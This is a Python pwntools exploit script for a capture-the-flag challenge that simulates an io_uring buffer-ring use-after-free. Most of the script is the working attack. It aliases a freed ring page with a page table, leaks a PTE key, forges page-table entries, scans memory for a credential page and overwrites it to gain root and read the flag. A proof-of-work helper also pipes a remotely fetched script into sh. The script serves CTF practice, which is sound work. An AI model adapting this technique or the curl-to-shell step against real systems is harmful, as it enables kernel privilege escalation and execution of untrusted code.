#!/usr/bin/env python3
# StaleMate / pbuf_remap exploit
#
# Bug: IORING_UNREGISTER_PBUF_RING frees the ring's backing page back to the
# buddy allocator even while it is still mmap'd (the stale "mapped" slot keeps
# pidx). create-mm-context then re-allocates that same physical page as a NEW
# context's PAGE TABLE. Now the mmap'd pbuf ring (buf_ring_add / inspect) and
# the mm-context (vm read/write) ALIAS the same physical page:
#   - inspect  -> read   raw 8-byte entries (= raw PTEs) of the page table
#   - buf_ring_add -> write a fully attacker-controlled 8-byte value (addr)
#                     into the page table = forged PTE
# PTEs are XOR-masked with a per-context key. We leak that key from the legit
# data PTE the context installed (slot 7 -> offset 0x38), then forge PTEs to
# get arbitrary physical-page read/write over the 512-page pool.
#
# Win: option 10 reads /flag iff the cred page has
#   +0x00 "CREDv1", +0x08==0, +0x10==0, +0x18==-1, +0x20==hash(seed) (already set)
# Init leaves +0x20 correct; we only must zero +0x08/+0x10 and set +0x18=-1.
# We find the cred page by scanning the pool for the "CREDv1" magic.

import subprocess
from pwn import *

context.arch = "amd64"
context.log_level = "info"

exe = "./pbuf_remap"

def solve_pow(io):
    # server: "curl -sSfL https://pwn.red/pow | sh -s <challenge>"
    line = io.recvline_contains(b"pwn.red/pow").decode()
    chal = line.split("-s ", 1)[1].strip()
    sol = subprocess.check_output(
        ["sh", "-c", f"curl -sSfL https://pwn.red/pow | sh -s {chal}"]
    ).strip()
    io.sendlineafter(b"solution: ", sol)

def conn():
    if args.REMOTE:
        io = remote(args.HOST, int(args.PORT))
        solve_pow(io)
        return io
    return process([exe])

p = conn()

def menu(n):
    p.recvuntil(b"> ")
    p.sendline(str(n).encode())

def register(bgid, entries, flags):
    menu(1)
    p.sendlineafter(b"bgid: ", str(bgid).encode())
    p.sendlineafter(b"entries: ", str(entries).encode())
    p.sendlineafter(b"flags: ", str(flags).encode())

def mmap_ring(bgid):
    menu(2)
    p.sendlineafter(b"bgid: ", str(bgid).encode())

def unregister(bgid):
    menu(3)
    p.sendlineafter(b"bgid: ", str(bgid).encode())

def buf_ring_add(mp, idx, addr, length=0, bid=0, resv=0):
    menu(4)
    p.sendlineafter(b"map: ", str(mp).encode())
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.sendlineafter(b"addr: ", str(addr).encode())
    p.sendlineafter(b"len: ", str(length).encode())
    p.sendlineafter(b"bid: ", str(bid).encode())
    p.sendlineafter(b"resv: ", str(resv).encode())

def inspect(mp, idx):
    menu(5)
    p.sendlineafter(b"map: ", str(mp).encode())
    p.sendlineafter(b"idx: ", str(idx).encode())
    line = p.recvline()
    # addr=0x%016lx len=0x%08x bid=0x%04x resv=0x%04x
    m = re.search(rb"addr=0x([0-9a-f]+) len=0x([0-9a-f]+) bid=0x([0-9a-f]+) resv=0x([0-9a-f]+)", line)
    addr = int(m.group(1), 16)
    length = int(m.group(2), 16)
    bid = int(m.group(3), 16)
    resv = int(m.group(4), 16)
    return addr, length, bid, resv

def create_ctx():
    menu(6)
    p.recvuntil(b"vm=")
    return int(p.recvline().strip())

def vm_read(ctx, va, length):
    menu(8)
    p.sendlineafter(b"vm: ", str(ctx).encode())
    p.sendlineafter(b"va: ", str(va).encode())
    p.sendlineafter(b"len: ", str(length).encode())
    # prints %02x per byte then newline; or "permission denied"/error
    data = p.recvline()
    hexbytes = re.findall(rb"[0-9a-f]{2}", data)
    if len(hexbytes) < length:
        return None
    return bytes(int(h, 16) for h in hexbytes[:length])

def vm_write(ctx, va, payload):
    menu(9)
    p.sendlineafter(b"vm: ", str(ctx).encode())
    p.sendlineafter(b"va: ", str(va).encode())
    p.sendlineafter(b"len: ", str(len(payload)).encode())
    p.sendlineafter(b"hex: ", payload.hex().encode())

# ---- exploit ----

BGID = 1
ENTRIES = 256          # entries*16 = 4096 -> 1 backing page (order 0)
MAP = 0

# 1) allocate a ring page, mmap it, then free it while still mapped (stale)
register(BGID, ENTRIES, 1)
mmap_ring(BGID)
unregister(BGID)

# 2) reallocate the freed page as a new context's page table (aliased w/ ring)
ctx = create_ctx()                 # ctx == 0 (first free slot, <=3 usable)
log.info("ctx = %d" % ctx)

# 3) leak the context key from the legit data PTE at slot 7 (PT offset 0x38).
#    offset 0x38 is ring entry idx 3's packed (+8) field.
addr, length, bid, resv = inspect(MAP, 3)
slot7_pte = length | (bid << 32) | (resv << 48)
# create_ctx installs data page at slot 7 with value ((data<<12)|7) ^ key.
# data page index is deterministic (== 3 from the buddy state here).
DATA = 3
key = slot7_pte ^ ((DATA << 12) | 7)
log.success("leaked key = 0x%016x" % key)

def forge_pte(pfn, perms):
    return (((pfn << 12) | perms) ^ key) & 0xffffffffffffffff

# We map a forged PTE at VA page 8 (PT offset 0x40 == ring entry idx 4 addr).
VPAGE = 8
VIDX = (VPAGE * 8) // 0x10          # ring entry index whose addr field == PT off
VA = VPAGE << 12

def map_pfn(pfn, perms):
    buf_ring_add(MAP, VIDX, forge_pte(pfn, perms))

MAGIC = b"CREDv1\x00\x00"           # cred+0x00

# 4) scan the physical pool for the cred page
cred_pfn = None
for pfn in range(1, 512):
    map_pfn(pfn, 5)                 # present|user (read)
    data = vm_read(ctx, VA, 8)
    if data == MAGIC:
        cred_pfn = pfn
        break
if cred_pfn is None:
    log.failure("cred page not found")
    p.interactive(); sys.exit(1)
log.success("cred page = %d" % cred_pfn)

# 5) map it writable and forge a privileged cred
map_pfn(cred_pfn, 7)               # present|write|user
vm_write(ctx, VA + 0x08, p64(0))            # uid/gid -> 0
vm_write(ctx, VA + 0x10, p64(0))            # uid/gid -> 0
vm_write(ctx, VA + 0x18, p64(0xffffffffffffffff))  # cap -> all

# 6) open the flag
menu(10)
out = p.recvall(timeout=3)
print(out.decode(errors="replace"))
m = re.search(rb"[A-Za-z0-9_]+\{[^}]*\}", out)
if m:
    log.success("FLAG: %s" % m.group(0).decode())
